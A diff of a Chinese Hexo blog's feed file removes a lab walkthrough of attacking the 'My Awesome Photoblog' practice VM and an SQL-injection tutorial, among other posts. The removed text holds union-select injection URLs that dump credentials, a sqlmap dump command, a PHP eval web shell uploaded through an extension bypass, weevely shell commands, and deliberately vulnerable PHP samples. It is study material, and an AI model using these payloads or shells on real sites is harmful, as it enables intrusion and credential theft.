f3371786962eb6fa317f998e59182ce386737ddd634d5b1e2bbce14fdedf0dc993bb3f1f0662cdd85dfadcbb8e510b598493551c1666ead6699efaec42267c286db3b9c13a40dc945cf3371f8e628b13154db51e50af08449fcd2bc6357beda3a5d9ea1fcd964b14761300f8a7e07365a8f1fd1b23f1f48b80d46f3cc96c0645449bdf150b45cde74bccd47928c28ec0da119ed6a35f42915a1980ccf7f449b4adea3d87a6995258575efb74d816406b114a5c6ee74a6aec213cf578b51138512581c1f5dcfd0bd584177184baa719032caad013e56e4f4550e63fa14bd09efb530a3e2d44dfcf2a01bbe7585b26df429f07d06cd5132ba9f368a7c1d8c86e343a7c394da3e5a885d9eff6740587f2ee51a3653187f8b270e9c741e23bc7a8094fd5fffa926d4c3e4142e10dbab272a062b733587f2984abf0409bbf1dad8958db9a24cf882fc3080c67cc4ff86c2bd8d0772d1fb4c89380d193426d8f80779502ffc6df0baac10d0e36bc0cfcf17f2781e1f9e17f82125b219409448864574a51dcf9505985f9e8ba9512aa10badfcf5d0bf2f0439708ecbc93465ef6b7e11db5da201504ca9384141fad3901e25352412ad59cfbf9b6b37f9b87b10588f114e24dc32cdaa8f850ddbcc2566c2a6968e192414b5ef5a80a87c4e5771fbd4f1dd790cbd71eb743442760b677d7366d21907d868482e9bb246119ba4e9fb3f2259a164f27713e51a6f3de0064b5a2c0abb42d2bcc93ea64508b7d3f338e76a7b3431aa6f6c9f26939b42b4783d171d47c669db0f23af6f29607616b866fd32c1f7c4ff9d41ac03c2b8b4f54e93a03fcfc48effd84de5a09336edc589cfd8da472868f5a48ec8e70162f30b2f0e320f072ff84f8af21d6fb68f4e5be3f6d576d1132233451cc35755cefb2441fbf436b069bab7987882aba78f4e8f38da3ec658b972d495c658eec1dfe67dc1d58aabd05e4fe4e0208c66d27b89f5848db0c88c6cb8b64d701c35b0308ab841b1d4ba92a26cff3f4c038833a9d63e602f3518b2516fc753380fc845bb04db15e9e620fd5a6bd690369ddd1b58b22da1d78e6d56d8e89d763f8fd481649d5f90ab2bb497c7149</script>
+  <div class="hbe hbe-content">
+    <div class="hbe hbe-input hbe-input-up">
+      <input class="hbe hbe-input-field hbe-input-field-up" type="password" id="hbePass">
+      <label class="hbe hbe-input-label hbe-input-label-up" for="hbePass">
+        <span class="hbe hbe-input-label-content hbe-input-label-content-up">加密文章，请输入密码</span>
+      </label>
+    </div>
+  </div>
 </div>
-<h2 id="方法一：尝试进行SQL注入">方法一：尝试进行SQL注入</h2>
-<h3 id="判断是否可以注入：">判断是否可以注入：</h3>
-<p>构造url：</p>
-<p><code>192.168.3.108/cat.php?id=1 and 1=1#</code></p>
-<p>页面正常显示</p>
-<p><code>192.168.3.108/cat.php?id=1 and 1=2#</code></p>
-<p>页面不正常显示：</p>
-<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20220810194602.png" alt="QQ截图20220810194602"></p>
-<p>结论：由此说明参数id存在sql注入。</p>
-<h3 id="判断列数">判断列数</h3>
-<p><code>192.168.3.108/cat.php?id=1 order by 1</code></p>
-<p><code>192.168.3.108/cat.php?id=1 order by 2</code></p>
-<p>…</p>
-<p><code>192.168.3.108/cat.php?id=1 order by 5</code></p>
-<p>此时发生报错：</p>
-<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20220810194855.png" alt="QQ截图20220810194855"></p>
-<p>则得知列数为4。</p>
-<h3 id="联合查询获取数据库名称">联合查询获取数据库名称</h3>
-<p>判断显示的列位：</p>
-<p><code>192.168.3.108/cat.php?id=1 and 1=2 union select 1,2,3,4#</code></p>
-<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20220810194926.png" alt="QQ截图20220810194926"></p>
-<p>得知第二列为显示位。继续查询数据库名：</p>
-<p><code>192.168.3.108/cat.php?id=1 and 1=2 union select 1,database(),3,4#</code></p>
-<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20220810194952.png" alt="QQ截图20220810194952"></p>
-<p>得知数据库名为 <code>photoblog</code></p>
-<h3 id="联合查询遍历表名">联合查询遍历表名</h3>
-<p><code>192.168.3.108/cat.php?id=1 and 1=2 union select 1,table_name,3,4 from information_schema.tables#</code></p>
-<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20220810195115.png" alt="QQ截图20220810195115"></p>
-<p>发现有一个users表，可能是网站后台的账号密码。</p>
-<h3 id="查询users列名">查询users列名</h3>
-<p><code>192.168.3.108/cat.php?id=1 and 1=2 union select 1,column_name,3,4 from information_schema.columns where table_name = 'users'#</code></p>
-<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20220810195157.png" alt="QQ截图20220810195157"></p>
-<h3 id="查询users表数据">查询users表数据</h3>
-<p><code>192.168.3.108/cat.php?id=1 and 1=2 union select 1,login,3,4 from users#</code></p>
-<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20220810195228.png" alt="QQ截图20220810195228"></p>
-<p>得到后台管理员用户名 ：</p>
-<blockquote>
-<p>admin</p>
-</blockquote>
-<p><code>192.168.3.108/cat.php?id=1 and 1=2 union select 1,password,3,4 from users#</code></p>
-<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20220810195317.png" alt="QQ截图20220810195317"></p>
-<p>得到密文：</p>
-<blockquote>
-<p>8efe310f9ab3efeae8d410a8e0166eb2</p>
-</blockquote>
-<p>长度为32，猜测为md5加密，在<a href="https://www.cmd5.com/">cmd5</a>网站解密：</p>
-<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20220810195632.png" alt="QQ截图20220810195632"></p>
-<p>得到密码：</p>
-<blockquote>
-<p>P4ssw0rd</p>
-</blockquote>
-<h3 id="登录后台">登录后台</h3>
-<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20220810195712.png" alt="QQ截图20220810195712"></p>
-<h2 id="方法二-：使用sqlmap">方法二 ：使用sqlmap</h2>
-<p>因为网页的标题是“My Awesome Photoblog”，可以猜测数据库名称为<code>photoblog</code>（在方法一中证明）</p>
-<p>使用sqlmap获取该数据库的全部数据：</p>
-<p><code>sqlmap –u http://192.168.3.108/cat.php?id=1 –D photoblog --dump-all --batch</code></p>
-<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20220810200042.png" alt="QQ截图20220810200042"></p>
-<p>直接获得了账户名和登录密码：</p>
-<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20220810200117.png" alt="QQ截图20220810200117"></p>
-<hr>
-<div class="tip bolt"><p>接下来getshell，这里介绍两种方法：</p>
-</div>
-<h2 id="方法一：一句话木马-蚁剑连接">方法一：一句话木马+蚁剑连接</h2>
-<p>构造一句话木马<code>yijuhua.php</code>并上传， 发现提示不允许上传php。进行一下简单的文件上传绕过，修改后缀为<code>.phP</code>，成功上传。</p>
-<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>PHP @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">'cmd'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>
-<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20220810200441.png" alt="QQ截图20220810200441"></p>
-<p>蚁剑连接：</p>
-<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20220810201802.png" alt="QQ截图20220810201802"></p>
-<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20220810202139.png" alt="QQ截图20220810202139"></p>
-<p>成功getshell！</p>
-<h2 id="方法二-：weevely-php菜刀-连接">方法二 ：weevely(php菜刀)连接</h2>
-<p>使用kali中的工具weevely，生成一个webshell文件：</p>
-<p><code>weevely generate hacker shell.php</code></p>
-<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20220810202446.png" alt="QQ截图20220810202446"></p>
-<p>修改后缀为<code>.phP</code>进行文件上传，然后使用weevely连接webshell：</p>
-<p><code>weevely http://192.168.0.131/admin/uploads/shell.PHP hacker</code></p>
-<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20220810202826.png" alt="QQ截图20220810202826"></p>
-<p>成功连接。</p>
-<details class="folding-tag" cyan="" close=""><summary> 参考文章： </summary>
-              <div class="content">
-              <div class="tag link"><a class="link-card" title="Hack the Pentester Lab: from SQL injection to Shell VM" href="https://www.hackingarticles.in/hack-pentester-lab-sql-injection-shell-vm/"><div class="left"><img src="https://img.anineg.space/logo-white.png"></div><div class="right"><p class="text">Hack the Pentester Lab: from SQL injection to Shell VM</p><p class="url">https://www.hackingarticles.in/hack-pentester-lab-sql-injection-shell-vm/</p></div></a></div><div class="tag link"><a class="link-card" title="My Awesome Photoblog靶机渗透WP" href="https://www.jianshu.com/p/dd8768dd2b58"><div class="left"><img src="https://img.anineg.space/logo-white.png"></div><div class="right"><p class="text">My Awesome Photoblog靶机渗透WP</p><p class="url">https://www.jianshu.com/p/dd8768dd2b58</p></div></a></div>
-              </div>
-            </details>
-]]></content>
+<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
       <categories>
         <category>学习笔记</category>
       </categories>
       <tags>
         <tag>靶机</tag>
         <tag>渗透</tag>
-        <tag>SQL注入</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>SQL注入漏洞（一）</title>
-    <url>/2022/02/16/SQL1/</url>
-    <content><![CDATA[<h1>SQL 注入漏洞简介</h1>
-<h2 id="SQL-注入漏洞产生原因及危害">SQL 注入漏洞产生原因及危害</h2>
-<p>SQL 注入漏洞是指攻击者通过浏览器或者其他客户端将恶意 SQL 语句插入到网站参数中,而网站应用程序末对其进行过滤,将恶意 SQL语句带入数据库使恶意 SQL 语句得以执行,从而使攻击者通过数据库获取敏感信息或者执行其他恶意操作。<br>
-SQL 注入漏洞可能会造成服务器的数据库信息泄露、数据被窃取、网页被篡改,甚至可能会造成网站被挂马、服务器被远程控制、被安装后门等。</p>
-<h2 id="SQL-注入漏洞示例代码分析">SQL 注入漏洞示例代码分析</h2>
-<p>以下是 SQL 注入漏洞的示例代码：</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">$id=$_GET['id'];</span><br><span class="line">$sql-"SELECT * FROM users WHBRE id=$id LIMIT O,1";</span><br><span class="line">$result=mysql_query(fsql);</span><br><span class="line">$row=mysql_fetch_array($result);</span><br></pre></td></tr></tbody></table></figure>
-<p>中间件通过 <code>$_GET['id']</code> 获取用户输入的 id 参数的值,并赋值给<code>$id</code> 这个变量。<code>$id</code> 在后面没有经过任何过滤,直接拼接到 SQL 语句中,然后在数据库中执行了此 SQL 语句。<br>
-如果用户提交 <code>index.php?id=1 and 1=1</code>，那么后面的 SQL 语句就变为 <code>SELECT * FROM users WHERE id=1 and 1=1 LIMIT 0,1</code>，会有正常的结果返回。<br>
-如果用户提交 <code>index.php?id=1 and 1=2</code>，那么后面的 SQL 语句就变为 <code>SELECT * FROM users WHERE id=1 and 1=2 LIMIT 0,1</code>，会有不正常的结果返回。</p>
-<h2 id="SQL注入分类">SQL注入分类</h2>
-<p>SQL注入按照数据类型分为<span class="p red">数字型注入</span>和<span class="p red">字符型注入</span>。注入点的数据类型为数字型时为数字型注入,注入点的数据类型为字符型时为字符型注入。<br>
-SQL注入按照服务器返回信息是否显示分为报错注入和盲注。如果在注入的过程中,程序将获取的信息或者报错信息直接显示在页面中,这样的注入为报错注入;如果在注入的过程中,程序不显示任何SQL报错信息,只能通过精心构造SQL语句,根据页面是否正常返回或者返回的时间判断注入的结果,这样的注入为盲注。</p>
-<h1>数字型注入</h1>
-<p>数字型注入就是注入点的数据类型是数字型,没有用单引号引起来。数字型注入的典型示例代码如下:</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">$id=$_GET['id'];</span><br><span class="line">$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";    //$id没有单引号</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row=mysql_fetch_array($result);</span><br></pre></td></tr></tbody></table></figure>
-<p>在 <code>WHERE id=$id</code>这个SQL语句的子句中,<code>$id</code>变量没有用单引号或者双引号引起来,而是直接拼接到了后面,这样的注入就是典型的数字型注入。</p>
-<h2 id="判断数字型注入的方法如下">判断数字型注入的方法如下:</h2>
-<h3 id="输入单引号-不正常返回。">输入单引号,不正常返回。</h3>
-<p>如果用户提交 <code>index.php?id=1'</code>,那么后面的SQL语句就变为 <code>SELECT * FROM users WHERE id=1' LIMIT 0,1</code>,SQL语句本身存在语法错误,会有不正常的结果返回。</p>
-<h3 id="输入and-1-1-正常返回。">输入<code>and 1=1</code>,正常返回。</h3>
-<p>如果用户提交 <code>index.php?id=1 and 1=1</code>,那么后面的SQL语句就变为 <code>SELECT * FROM users WHERE id=1 and 1=1 LIMIT 0,1</code>,会有正常的结果返回。</p>
-<h3 id="输入and-1-2-不正常返回">输入<code>and 1=2</code>,不正常返回</h3>
-<p>如果用户提交 <code>index.php?id=1 and 1=2</code>,那么后面的SQL语句就变为 <code>SELECT * FROM users WHERE id=1 and 1=2 LIMIT 0,1</code>,会有不正常的结果返回。<br>
-数字型注入的注入点主要通过上面3个语句来判断,如果输入的返回结果与上面相符,说明测试语句中的恶意SQL语句被带入数据库中并且成功执行,那么就可能存在数字型注入。具体有没有数字型注入,是否可以通过数字型注入获取有效信息,还需要大量的测试来验证。</p>
-<h1>字符型注入</h1>
-<p>字符型注入就是注入点的数据类型是字符型。字符型注入与数字型注入的区别就是字符型注入要用一对单引号引起来。字符型注入的典型示例代码如下：</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">$id=$_GET['id'];</span><br><span class="line">$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";    //'$id'有单引号</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row=mysql_fetch_array($result);</span><br></pre></td></tr></tbody></table></figure>
-<p>这个示例代码与数字型注入的示例代码基本一致,只是在后面的SQL语句拼接中,<code>$id</code>多了一对单引号,<code>$id</code>是字符型数据,这就是典型的字符型注入。</p>
-<h2 id="判断字符型注入的方法如下">判断字符型注入的方法如下:</h2>
-<h3 id="输入单引号-不正常返回。-v2">输入单引号,不正常返回。</h3>
-<p>如果用户提交 <code>index,php?id=1'</code>,那么后面的SQL语句就变为 <code>SELECT * FROM users WHERE id=1' LIMIT 0,1</code>,SQL语句本身存在语法错误,会有不正常的结果返回。</p>
-<h3 id="输入-and-1-1-正常返回">输入<code>'and'1'='1</code>,正常返回</h3>
-<p>如果用户提交 <code>index.php?id=1 'and' 1'='1</code>,那么后面的SQL语句就变为 <code>SELECT * FROM users WHERE id='1' and '1'='1' LIMIT 0,1</code>,会有正常的结果返回。</p>
-<h3 id="输入-and-1-2-不正常返回">输入<code>'and'1'='2</code>,不正常返回</h3>
-<p>如果用户提交 <code>index.php?id=1 'and' 1'='2</code>,那么后面的SQL语句就变为 <code>SELECT * FROM users WHERE id='1' and '1'='2' LIMIT 0,1</code>,会有不正常的结果返回。<br>
-字符型注入的注入点主要通过上面3个语句来判断,如果输入的返回结果与上面相符,说明测试语句中的恶意SQL语句被带入数据库中并且成功执行,那么就可能存在字符型注入。具体有没有字符型注入,是否可以通过字符型注入获取有效信息,还需要大量的测试来验证。</p>
-]]></content>
-      <categories>
-        <category>学习笔记</category>
-      </categories>
-      <tags>
-        <tag>SQL注入</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>随机背景API接口整理</title>
-    <url>/2022/03/20/backgroundAPI/</url>
-    <content><![CDATA[<h1>废话不多说，上图！（每次刷新都不一样哦~）</h1>
-<p>（API链接在后面）</p>
-<p><img src="https://api.mtyqx.cn/api/random.php" alt=""></p>
-<p><img src="https://api.mtyqx.cn/tapi/random.php" alt=""></p>
-<p><img src="https://api.ixiaowai.cn/api/api.php" alt=""></p>
-<p><img src="https://api.ixiaowai.cn/mcapi/mcapi.php" alt=""></p>
-<p><img src="https://acg.toubiec.cn/random.php" alt=""></p>
-<p><img src="https://www.dmoe.cc/random.php" alt=""></p>
-<p><img src="https://api.paugram.com/wallpaper/?source=sina&amp;category=us" alt=""></p>
-<h1>API接口链接</h1>
-<h2 id="必应壁纸">必应壁纸</h2>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">https://api.dujin.org/bing/1366.php (1366*768)</span><br><span class="line">https://api.dujin.org/bing/1920.php (1920*1080)</span><br><span class="line">https://api.dujin.org/bing/m.php    (1080*1920)</span><br><span class="line">//api.timecdn.cn/libs/wallpaper/v1  (1920*1080)</span><br></pre></td></tr></tbody></table></figure>
-<p><img src="http://api.timecdn.cn/libs/wallpaper/v1" alt=""></p>
-<center>今日必应壁纸</center>
-<h2 id="野生动漫-API">野生动漫 API</h2>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">https://api.mtyqx.cn/api/random.php</span><br><span class="line">https://api.mtyqx.cn/tapi/random.php</span><br></pre></td></tr></tbody></table></figure>
-<h2 id="系列-API（需自己按照网站说明调用-API-参数）">系列 API（需自己按照网站说明调用 API 参数）</h2>
-<blockquote>
-<p>小歪 API</p>
-<p><a href="https://api.ixiaowai.cn/">https://api.ixiaowai.cn</a></p>
-</blockquote>
-<blockquote>
-<p>未知名称动漫 API</p>
-<p><a href="https://acg.toubiec.cn/">https://acg.toubiec.cn</a></p>
-</blockquote>
-<blockquote>
-<p>樱花 API</p>
-<p><a href="http://www.dmoe.cc/">http://www.dmoe.cc/</a></p>
-</blockquote>
-<blockquote>
-<p>岁月小筑随机背景 API</p>
-<p><a href="https://img.xjh.me/">https://img.xjh.me</a></p>
-</blockquote>
-<blockquote>
-<p>保罗 API</p>
-<p><a href="https://api.paugram.com/help/wallpaper/">https://api.paugram.com/help/wallpaper/</a></p>
-</blockquote>
-<blockquote>
-<p>樱道随机图片</p>
-<p><a href="https://img.r10086.com/">https://img.r10086.com/</a></p>
-</blockquote>
-<blockquote>
-<p>墨天逸</p>
-<p><a href="http://api.mtyqx.cn/">http://api.mtyqx.cn</a></p>
-</blockquote>
-<blockquote>
-<p>Unsplash</p>
-<p><a href="https://source.unsplash.com/">https://source.unsplash.com/</a></p>
-</blockquote>
-<blockquote>
-<p>后宫漫图：</p>
-<p><a href="https://acg.sx/images">https://acg.sx/images</a></p>
-</blockquote>
-<blockquote>
-<p>EEEDOG</p>
-<p><a href="https://www.eee.dog/tech/rand-pic-api.html">https://www.eee.dog/tech/rand-pic-api.html</a></p>
-</blockquote>
-<blockquote>
-<p>东方 Project</p>
-<p><a href="https://img.paulzzh.tech/">https://img.paulzzh.tech/</a></p>
-</blockquote>
-<blockquote>
-<p>搏天 API</p>
-<p><a href="https://api.btstu.cn/doc/sjbz.php">https://api.btstu.cn/doc/sjbz.php</a></p>
-</blockquote>
-<blockquote>
-<p>汐岑 ACG</p>
-<p><a href="https://acg.yanwz.cn/">https://acg.yanwz.cn</a></p>
-</blockquote>
-<blockquote>
-<p>凌一 API</p>
-<p><a href="https://api.lyiqk.cn/">https://api.lyiqk.cn</a></p>
-</blockquote>
-<blockquote>
-<p>Lorem Picsum</p>
-<p><a href="https://picsum.photos/">https://picsum.photos/</a></p>
-</blockquote>
-<blockquote>
-<p>API 接口文档 - 夏沫博客</p>
-<p><a href="https://cdn.seovx.com/">https://cdn.seovx.com/</a></p>
-</blockquote>
-<blockquote>
-<p>Ushio API</p>
-<p><a href="https://www.eee.dog/tech/rand-pic-api.html">https://www.eee.dog/tech/rand-pic-api.html</a></p>
-</blockquote>
-<blockquote>
-<p>点滴 API</p>
-<p><a href="https://api.ddkjt.com/">https://api.ddkjt.com/</a></p>
-</blockquote>
-<blockquote>
-<p>Langford’s API</p>
-<p><a href="https://api.ucany.net/">https://api.ucany.net/</a></p>
-</blockquote>
-<blockquote>
-<p>一铭 API</p>
-<p><a href="https://api.wer.plus/product/doc?id=2">https://api.wer.plus/product/doc?id=2</a></p>
-<p><a href="https://api.wer.plus/product/doc?id=3">https://api.wer.plus/product/doc?id=3</a></p>
-</blockquote>
-<blockquote>
-<p>R0A1NG’s API<br>
-<a href="https://api.roaing.com/#/doc/dongmanimg">https://api.roaing.com/#/doc/dongmanimg</a></p>
-</blockquote>
-<blockquote>
-<p>JacksonXE の API<br>
-<a href="https://api.jacksonxe.cn/api/file/random?sole=">https://api.jacksonxe.cn/api/file/random?sole=</a></p>
-</blockquote>
-<div class="tag link"><a class="link-card" title="随机壁纸API整理" href="https://quest.myxxts.club/archives/54/"><div class="left"><img src="https://sdn.geekzu.org/avatar/b78149ae3a65c308a991d61840da7225?s=&amp;r=&amp;d="></div><div class="right"><p class="text">随机壁纸API整理</p><p class="url">https://quest.myxxts.club/archives/54/</p></div></a></div>
-]]></content>
-      <categories>
-        <category>博客</category>
-      </categories>
   </entry>
   <entry>
     <title>IP地址详解</title>
@@ -610,26 +633,20 @@ SQL注入按照服务器返回信息是否显示分为报错注入和盲注。�
       </categories>
   </entry>
   <entry>
-    <title>VulnHub——DC-1靶机学习记录</title>
-    <url>/2022/09/24/dc1/</url>
-    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">
-  <script id="hbeData" type="hbeData" data-hmacdigest="84e5950b4f6928370c633f0f1a1812ee8067963b5a6d847c60c774e437edb9fb">bed7a276ba7847d76277538a14c701d513208fcd9bec01ee5395d46614c8a8d77a7487d3838d985e6244ba9499c43727f0817a7c1d48622c8c2bfb7b6a8aba9bebac452a3380872edb394f4ce5260c0b543356768910e99ec6ced4db139df77114896906cb314cd3d31b36bd2e2976fdaf780288d9be00c3207d30101f1ba4c6f0247443ff05f8fa65f91ea64bda0236e442d53cd761dd272e7adda3365808d99fe2c4ce47eb10db32512dc5eaa5efc39976d5e25393539c4d229126208ff59e2f615950e2aefdd8cbc9f76f06e5e19194ad1b525da4b6b98b49926d2f2eadfdf5194511986954bdff328871779b0cc3cc29726bf67cd4edba7dd4255f4a85807fea077ae7864bd950ceae3e55754fb9e7c7ec1314910fb83de0555b86db174ef824a5f8bb31f5dca1526a2b87c71ec7552ee2315a43200aa81a2adb5c8b8e0f6e1eac168c661f47c022ba89ad53cfd7ad21bdf518191e7c4bfa96de18129935da0781be88c84f6e97ce0269827eab9d6a08637ec05b52fbb34b67fc559fff245868ab8078132a6a60992a6442e0b411797a40210b2a47780649dc235bb06738b3f985a16fc31899f08c61b8a28e3ad4f8ac24c49c6885a597ff0e19513152d799b8588e23bca1659877a692363826a0ec08eed5306ae1a75befa4238c00283cdb3ab6d0f4a271ed814c2717e922325c27289dccea8d3a40699f71da3d13ecd90f833910705db6f4839585c25f2249a9d659ca01ff137c03e4672114165e380f391272148d6a652204e71d1f0b4be43c9a0aeebacd4baf7605777c8db316d2b2d76b1948fb821ae5edc3a799142616788d1df1ae847432bb2fd382176d6f1d5d833568aeaea6461b5a2aa47cda200425f2de7944a898576a6603a880137e300b8a229734e593d710738521e8c66804853557ba6a6804b3f09a8633a590887abcf827d2f4e0b44c676a1f37404bcdd5d27bf550b5f78d29eb8718bb51f74577511cfd8ad9ad556af306e49195f2d49eaf474c027084376ce24c0caddf9b7d14d24b8c08651451e0732cf38d1635bb27dd7591a830a795dbf2df83a71e594e6d113cb3745ef89696c7b566af22b7c356cae5f5768f56ba5ee64760b5d820194656db02bc7602d9920025f8cc09d0a58480661a3acee7f6b80f2d9a6bfe08f14e4b69826177422737797526c8adc69efb376865edaa30243adf7a808f04f0d9e008a6f5ae66bdca6ea3f27f4ddc03c15c54920dc3043eb92c3a2c61f282adf2f3371786962eb6fa317f998e59182ce386737ddd634d5b1e2bbce14fdedf0dc993bb3f1f0662cdd85dfadcbb8e510b598493551c1666ead6699efaec42267c286db3b9c13a40dc945cf3371f8e628b13154db51e50af08449fcd2bc6357beda3a5d9ea1fcd964b14761300f8a7e07365a8f1fd1b23f1f48b80d46f3cc96c0645449bdf150b45cde74bccd47928c28ec0da119ed6a35f42915a1980ccf7f449b4adea3d87a6995258575efb74d816406b114a5c6ee74a6aec213cf578b51138512581c1f5dcfd0bd584177184baa719032caad013e56e4f4550e63fa14bd09efb530a3e2d44dfcf2a01bbe7585b26df429f07d06cd5132ba9f368a7c1d8c86e343a7c394da3e5a885d9eff6740587f2ee51a3653187f8b270e9c741e23bc7a8094fd5fffa926d4c3e4142e10dbab272a062b733587f2984abf0409bbf1dad8958db9a24cf882fc3080c67cc4ff86c2bd8d0772d1fb4c89380d193426d8f80779502ffc6df0baac10d0e36bc0cfcf17f2781e1f9e17f82125b219409448864574a51dcf9505985f9e8ba9512aa10badfcf5d0bf2f0439708ecbc93465ef6b7e11db5da201504ca9384141fad3901e25352412ad59cfbf9b6b37f9b87b10588f114e24dc32cdaa8f850ddbcc2566c2a6968e192414b5ef5a80a87c4e5771fbd4f1dd790cbd71eb743442760b677d7366d21907d868482e9bb246119ba4e9fb3f2259a164f27713e51a6f3de0064b5a2c0abb42d2bcc93ea64508b7d3f338e76a7b3431aa6f6c9f26939b42b4783d171d47c669db0f23af6f29607616b866fd32c1f7c4ff9d41ac03c2b8b4f54e93a03fcfc48effd84de5a09336edc589cfd8da472868f5a48ec8e70162f30b2f0e320f072ff84f8af21d6fb68f4e5be3f6d576d1132233451cc35755cefb2441fbf436b069bab7987882aba78f4e8f38da3ec658b972d495c658eec1dfe67dc1d58aabd05e4fe4e0208c66d27b89f5848db0c88c6cb8b64d701c35b0308ab841b1d4ba92a26cff3f4c038833a9d63e602f3518b2516fc753380fc845bb04db15e9e620fd5a6bd690369ddd1b58b22da1d78e6d56d8e89d763f8fd481649d5f90ab2bb497c7149</script>
-  <div class="hbe hbe-content">
-    <div class="hbe hbe-input hbe-input-up">
-      <input class="hbe hbe-input-field hbe-input-field-up" type="password" id="hbePass">
-      <label class="hbe hbe-input-label hbe-input-label-up" for="hbePass">
-        <span class="hbe hbe-input-label-content hbe-input-label-content-up">加密文章，请输入密码</span>
-      </label>
-    </div>
-  </div>
+    <title>某神奇社团的招新视频~</title>
+    <url>/2022/07/29/ladybug/</url>
+    <content><![CDATA[<div class="tip "><p>Tips：如有背景音乐自动播放，可以在左下角弹窗内关闭。</p>
 </div>
-<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
+<div align="center" class="aspect-ratio">
+    <iframe src="https://player.bilibili.com/player.html?aid=216487398&amp;&amp;page=1&amp;as_wide=1&amp;high_quality=1&amp;danmaku=0" scrolling="no" border="0" frameborder="no" framespacing="0" high_quality="1" danmaku="1" allowfullscreen="true"> 
+    </iframe>
+</div>
+]]></content>
       <categories>
-        <category>学习笔记</category>
+        <category>视频</category>
       </categories>
       <tags>
-        <tag>靶机</tag>
-        <tag>渗透</tag>
+        <tag>bilibili</tag>
       </tags>
   </entry>
   <entry>
@@ -1007,71 +1024,60 @@ hexo clean            # 清除缓存和已生成的静态文件</p>
       </tags>
   </entry>
   <entry>
-    <title>主页源码修改记录（简单网页倒计时+跳转+文本替换）</title>
-    <url>/2023/04/14/indexcode/</url>
-    <content><![CDATA[<h1>网站模板</h1>
-<p>我的主页<a href="https://anineg.space/">ANINEGの小屋</a>模板是使用的来自<a href="https://html5up.net/">https://html5up.net</a>的免费模板，以下是网页的介绍：</p>
+    <title>PE启动盘的制作</title>
+    <url>/2022/03/12/pe/</url>
+    <content><![CDATA[<h1>下载制作工具</h1>
 <ul>
-<li>Fully <strong>Responsive</strong></li>
-<li>Built on intelligent <strong>HTML5 + CSS3</strong></li>
-<li>Super <strong>Customizable</strong></li>
-<li><strong>100% Free</strong> under the <a href="https://html5up.net/license">Creative Commons</a></li>
+<li>制作启动盘推荐使用<a href="https://www.upe.net/">优启通</a>，相对<s>大白菜，老毛桃</s>等工具而言相当简洁干净，不会对通过启动盘安装的系统安装预装软件。</li>
 </ul>
-<p>有需要的同学们可以去自行下载。</p>
-<p><img src="https://img.anineg.space/myindex.png" alt=""></p>
-<h1>源码修改</h1>
-<p>在原有模板的基础上，我增添了如下功能：</p>
-<ol>
-<li>它会在页面上显示10秒倒计时，结束后后自动跳转到博客页。</li>
-<li>在倒计时这10秒中可以对博客网页进行预加载。</li>
-<li>当用户单击网页任何位置时，倒计时停止，并将显示倒计时的文本替换为“欢迎访问ANINEG的小屋”</li>
-</ol>
-<p>以下是实现过程：</p>
-<figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> preloadUrl = <span class="string">"https://blog.anineg.space/"</span>; <span class="comment">// 需要预加载的页面地址</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> iframe = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">"iframe"</span>); <span class="comment">// 创建一个iframe元素</span></span></span><br><span class="line"><span class="language-javascript">    iframe.<span class="property">style</span>.<span class="property">display</span> = <span class="string">"none"</span>; <span class="comment">// 将iframe元素隐藏</span></span></span><br><span class="line"><span class="language-javascript">    iframe.<span class="property">src</span> = preloadUrl; <span class="comment">// 设置预加载页面的地址</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(iframe); <span class="comment">// 将iframe元素添加到body中，开始预加载</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> count = <span class="number">13</span>; <span class="comment">// 设置倒计时时间</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> 